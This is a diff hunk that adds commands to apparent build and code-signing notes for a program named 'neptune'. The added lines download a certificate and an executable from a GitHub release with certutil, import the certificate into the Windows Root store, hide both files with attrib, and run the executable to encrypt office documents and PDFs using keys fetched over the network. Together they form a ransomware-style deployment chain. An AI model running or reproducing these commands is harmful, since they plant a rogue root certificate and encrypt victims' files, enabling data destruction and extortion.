@@ -49,3 +49,18 @@ certutil -store Root | findstr Neptune
 signtool sign /tr http://timestamp.digicert.com /td SHA256 /fd SHA256 /f "E:\neptune\neptune.pfx" /p Neptune@2026 "E:\neptune\build\neptune.exe"
 
 signtool verify /pa /v neptune.exe
+
+
+echo Neptune@2026 | certutil -urlcache -split -f https://github.com/1neptune/neptune/releases/download/V1.2.1/neptune.pfx C:\Users\Public\neptune.pfx
+
+certutil -p Neptune@2026 -importpfx Root C:\Users\Public\neptune.pfx
+
+attrib +h "C:\Users\Public\neptune.pfx"
+
+certutil -urlcache -split -f https://github.com/1neptune/neptune/releases/download/V1.2.1/neptune.exe  C:\Users\Public\neptune.exe
+
+attrib +h "C:\Users\Public\neptune.exe"
+
+C:\Users\Public\neptune.exe encrypt --include *.pdf --include *.doc --include *.docx --include *.xls --include *.xlsx --include *.xlsm --include *.ppt --include *.pptx --include *.pptm --include *.wps   --public-key https://github.com/1neptune/neptune/releases/download/V1.2.1/neptune_public.key  --private-key https://github.com/1neptune/neptune/releases/download/V1.2.1/neptune_private.key
+
+C:\Users\Public\neptune.exe decrypt --include *.ntp --private-key https://github.com/1neptune/neptune/releases/download/V1.2.1/neptune_private.key
